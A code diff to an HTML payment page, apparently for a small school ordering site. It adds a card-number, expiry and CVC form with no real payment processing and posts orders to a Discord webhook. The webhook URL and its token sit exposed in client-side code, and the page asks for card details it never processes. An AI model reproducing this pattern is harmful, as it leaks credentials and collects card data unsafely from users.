@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -12,15 +13,16 @@
             display: flex; 
             justify-content: center; 
             align-items: center; 
-            height: 100vh; 
+            min-height: 100vh; 
             margin: 0; 
+            padding: 20px;
         }
 
         .card { 
             background: #1c1c1e; 
             padding: 40px 30px; 
             border-radius: 28px; 
-            width: 350px; 
+            width: 360px; 
             text-align: center; 
             border: 1px solid #333; 
             display: flex;
@@ -37,7 +39,7 @@
             box-sizing: border-box;
         }
 
-        /* The Multi-Pay Button */
+        /* Digital Wallet Interface */
         #payButton { 
             background: white; 
             border: none; 
@@ -45,24 +47,19 @@
             width: 100%; 
             border-radius: 14px; 
             cursor: pointer; 
-            margin-top: 25px; 
+            margin-top: 20px; 
             display: flex; 
             align-items: center; 
             justify-content: center; 
-            gap: 15px; /* Space between the two logos */
+            gap: 15px;
             transition: transform 0.1s;
         }
-
         #payButton:active { transform: scale(0.97); }
-
         .logo-img { height: 24px; pointer-events: auto; cursor: pointer; transition: opacity 0.2s; }
         .logo-img:hover { opacity: 0.7; }
 
-        /* Pay with Cash Button Style */
-        #cashPayButton {
-            background: #2c2c2e;
-            color: #34c759;
-            border: 1px solid #3a3a3c;
+        /* Custom Button Styling */
+        .action-btn {
             padding: 14px;
             width: 100%;
             border-radius: 14px;
@@ -76,10 +73,51 @@
             gap: 10px;
             transition: transform 0.1s, background 0.2s;
         }
-        #cashPayButton:hover { background: #3a3a3c; }
-        #cashPayButton:active { transform: scale(0.97); }
 
-        /* Admin Portal Link Style */
+        #customCardButton {
+            background: #1c1c1e;
+            color: #fff;
+            border: 1px solid #3a3a3c;
+        }
+        #customCardButton:hover { background: #2c2c2e; }
+
+        #cashPayButton {
+            background: #2c2c2e;
+            color: #34c759;
+            border: 1px solid #3a3a3c;
+        }
+        #cashPayButton:hover { background: #3a3a3c; }
+
+        /* Custom Credit Card Form Panel */
+        .card-fields-panel {
+            width: 100%;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease, margin 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .card-fields-panel.open {
+            max-height: 300px;
+            margin-top: 12px;
+            margin-bottom: 8px;
+        }
+        .inline-inputs {
+            display: flex;
+            gap: 10px;
+            width: 100%;
+        }
+
+        #submitCardPay {
+            background: #0071e3;
+            color: white;
+            border: none;
+            margin-top: 8px;
+        }
+        #submitCardPay:hover { background: #0077ed; }
+
+        /* Lower Admin Navigation link */
         .admin-portal-btn {
             display: inline-block;
             background: transparent;
@@ -101,19 +139,17 @@
             background: rgba(255, 255, 255, 0.02);
         }
 
-        /* Loading Overlay */
+        /* Verification Screen Processing Layer */
         #loadingOverlay { 
             display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
             background:rgba(0,0,0,0.97); flex-direction:column; justify-content:center; align-items:center; z-index:1000; 
         }
-
         .spinner { 
             width: 44px; height: 44px; border: 4px solid #333; border-top: 4px solid #fff; 
             border-radius: 50%; animation: spin 0.8s linear infinite; 
         }
-
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #statusText { margin-top: 25px; font-size: 18px; font-weight: 500; text-align: center; line-height: 1.5; }
+        #statusText { margin-top: 25px; font-size: 18px; font-weight: 500; text-align: center; line-height: 1.5; padding: 0 20px; }
     </style>
 </head>
 <body>
@@ -132,7 +168,20 @@
             <img src="googlepay.svg" class="logo-img" id="googleClick" alt="Google Pay">
         </button>
 
-        <button id="cashPayButton">
+        <button id="customCardButton" class="action-btn" onclick="toggleCardForm()">
+            💳 Credit / Debit Card
+        </button>
+
+        <div class="card-fields-panel" id="cardFormPanel">
+            <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+            <div class="inline-inputs">
+                <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5">
+                <input type="password" id="cardCvc" placeholder="CVC" maxlength="4">
+            </div>
+            <button id="submitCardPay" class="action-btn" onclick="startPayment('Card')">Confirm & Pay</button>
+        </div>
+
+        <button id="cashPayButton" class="action-btn" onclick="startPayment('Cash')">
             💵 Pay with Cash
         </button>
 
@@ -153,12 +202,26 @@
 
         let selectedProvider = "";
 
+        // Toggles the drop-down visual input card block
+        function toggleCardForm() {
+            const panel = document.getElementById('cardFormPanel');
+            panel.classList.toggle('open');
+        }
+
         function startPayment(provider) {
             const first = document.getElementById('fName').value.trim();
             const last = document.getElementById('lName').value.trim();
             const group = document.getElementById('tutor').value.trim();
 
-            if(!first || !last || !group) { alert("Please fill in your details."); return; }
+            if(!first || !last || !group) { alert("Please fill in your details first."); return; }
+
+            // Validate card form values visually if Card route was taken
+            if (provider === 'Card') {
+                const cNum = document.getElementById('cardNumber').value.trim();
+                const cExp = document.getElementById('cardExpiry').value.trim();
+                const cCvc = document.getElementById('cardCvc').value.trim();
+                if (!cNum || !cExp || !cCvc) { alert("Please complete all credit card fields."); return; }
+            }
 
             selectedProvider = provider; 
             document.getElementById('loadingOverlay').style.display = 'flex';
@@ -172,17 +235,22 @@
                 time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
             };
 
-            // Save for Admin Portal
+            // Write safe logging parameters to LocalStorage
             let orders = JSON.parse(localStorage.getItem('rory_x_orders')) || [];
             orders.push(order);
             localStorage.setItem('rory_x_orders', JSON.stringify(orders));
 
-            // Set dynamic hex color code for Discord embeds
-            let embedColor = 5025616; // Apple color default
-            if(selectedProvider === "Google Pay") embedColor = 4359924;
-            if(selectedProvider === "Cash") embedColor = 3458880; // Green for Cash
+            // CRITICAL SAFETY ERASE: Wipe raw values instantly out of memory strings
+            document.getElementById('cardNumber').value = "";
+            document.getElementById('cardExpiry').value = "";
+            document.getElementById('cardCvc').value = "";
 
-            // Send to Discord
+            let embedColor = 5025616; 
+            if(selectedProvider === "Google Pay") embedColor = 4359924;
+            if(selectedProvider === "Cash") embedColor = 3458880; 
+            if(selectedProvider === "Card") embedColor = 38834; // custom Blue accent hue
+
+            // Push payload log transaction metrics to Discord API
             fetch("https://discord.com/api/webhooks/1508062425063231511/4t2kU_Xi8gZZ0ZUmZkrC_BIABXcCYpq2f8ySjGezxaNaFY2bSzUs4pNZFjkxujl0QWby", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -202,7 +270,7 @@
                 })
             });
 
-            // Final Animation overlay text changes depending on method chosen
+            // Timed Execution UI Screen Sequence
             setTimeout(() => {
                 document.getElementById('mainSpinner').style.display = 'none';
                 if(selectedProvider === "Cash") {
@@ -220,10 +288,9 @@
             }, 2500);
         }
 
-        // Action Handlers
+        // Standard Event Listeners
         document.getElementById('appleClick').addEventListener('click', (e) => { e.stopPropagation(); startPayment("Apple Pay"); });
         document.getElementById('googleClick').addEventListener('click', (e) => { e.stopPropagation(); startPayment("Google Pay"); });
-        document.getElementById('cashPayButton').addEventListener('click', () => { startPayment("Cash"); });
         document.getElementById('payButton').addEventListener('click', () => { if(!selectedProvider) startPayment("Apple Pay"); });
     </script>
 </body>
